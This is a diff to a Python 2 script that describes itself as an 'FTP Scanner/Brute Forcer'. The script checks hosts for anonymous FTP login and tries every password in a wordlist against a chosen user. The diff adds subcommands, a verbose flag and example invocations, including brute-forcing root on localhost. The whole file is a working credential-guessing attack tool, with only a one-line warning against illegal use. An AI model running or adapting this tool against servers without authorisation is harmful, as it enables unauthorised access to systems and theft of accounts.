@@ -2,20 +2,29 @@
 
 """ FTP Scanner/Brute Forcer
 
-    Use this to either scan a host for anonymous logins or to try a
-    password list against a host.
+    Use this to either scan a host for anonymous FTP logins or
+    to try a password list against a host.
 
     Don't be a moron, please don't use this for something illegal.
 
     Usage:
-        ftp_anon_scanner.py --brute [<host> <user> <password_file>]
-        ftp_anon_scanner.py --anon [<host>]
-        ftp_anon_scanner.py (-h | --help)
-        ftp_anon_scanner.py (-v | --version)
+        ftp.py brute [-v <host> <user> <password_file>]
+        ftp.py anon [-v <host>]
+        ftp.py -h | --help
+        ftp.py --version
 
     Options:
+        host            Host name to scan/attack
+        user            Username to attack against
+        password_file   newline separated wordlist
+        -v              verbose
         -h --help       Show this screen.
         --version       Show version
+
+    Examples:
+        ./ftp.py anon ftp.debian.org
+        ./ftp.py brute localhost root wordlist/general/big.txt
+        ./ftp.py brute -v localhost root wordlist/general/common.txt
 """
 
 import ftplib
@@ -23,26 +32,25 @@ from docopt import docopt
 from utilities import escape_color
 
 
-def brute_login(hostname, user_name, password_file):
+def brute_login(hostname, user_name, password_file, verbose=False):
     fp = open(password_file, 'r')
 
     for line in fp.readlines():
         password = line.strip('\r').strip('\n')
 
-        print "[+] Trying: " + user_name + "/" + password
+        if verbose:
+            print "[+] Trying: " + user_name + "/" + password
 
         try:
             ftp = ftplib.FTP(hostname)
             ftp.login(user_name, password)
-            print escape_color('[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + user_name + ":" + password, "green")
             ftp.quit()
 
             return (user_name, password)
         except Exception:
             pass
 
-    print escape_color('[-] User name or password not in FTP credentials.', "red")
-    return (None, None)
+    return False
 
 
 def anon_login(hostname):
@@ -57,7 +65,7 @@ def anon_login(hostname):
 
 
 def main(arguments):
-    if arguments['--anon']:
+    if arguments['anon']:
         if not arguments['<host>']:
             host = raw_input("Hostname: ")
         else:
@@ -69,7 +77,7 @@ def main(arguments):
             print escape_color('[*] ' + str(host) + ' FTP Anonymous Logon Succeeded.', "green")
         else:
             print escape_color('[-] ' + str(host) + ' FTP Anonymous Logon Failed.', "red")
-    elif arguments['--brute']:
+    elif arguments['brute']:
         if not arguments['<host>']:
             host = raw_input("Hostname: ")
         else:
@@ -85,7 +93,15 @@ def main(arguments):
         else:
             password_file = arguments['<password_file>']
 
-        brute_login(host, user, password_file)
+        if arguments['-v']:
+            credentials = brute_login(host, user, password_file, verbose=True)
+        else:
+            credentials = brute_login(host, user, password_file)
+
+        if credentials:
+            print escape_color('[*] FTP Logon Succeeded: ' + credentials[0] + ":" + credentials[1], "green")
+        else:
+            print escape_color('[-] No password found for that user on the FTP server.', "red")
 
 
 if __name__ == '__main__':
